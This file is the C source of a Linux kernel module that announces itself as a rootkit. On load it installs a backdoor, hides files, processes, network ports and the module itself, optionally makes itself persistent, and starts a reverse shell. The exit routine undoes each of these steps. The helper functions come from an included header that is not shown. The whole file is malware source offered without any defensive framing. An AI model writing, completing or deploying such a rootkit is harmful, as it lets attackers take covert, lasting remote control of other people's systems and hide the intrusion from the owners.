#include "../header/hide.h"

char* enable_consistency = "N";
module_param(enable_consistency, charp, 0000);
MODULE_PARM_DESC(enable_consistency, "whether enable consistency.");

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    backdoor();
    if (strcmp(enable_consistency, "N") == 0)
        disable_module();
    hide_file();
    proc_hide();
    port_hide();
    mod_hide();
    if (strcmp(enable_consistency, "Y") == 0)
        keep_rootkit();
    shellreverse_init();
    return 0;
}

static void __exit mode_exit(void) {
    cleanbackdoor();
    if (strcmp(enable_consistency, "N") == 0)
        disable_module_exit();
    hide_file_cleanup();
    proc_unhide();
    port_unhide();
    mod_unhide();
    shellreverse_exit();
    printk(KERN_INFO "Rootkit is leaving.\n");
}

module_init(mode_init);
module_exit(mode_exit);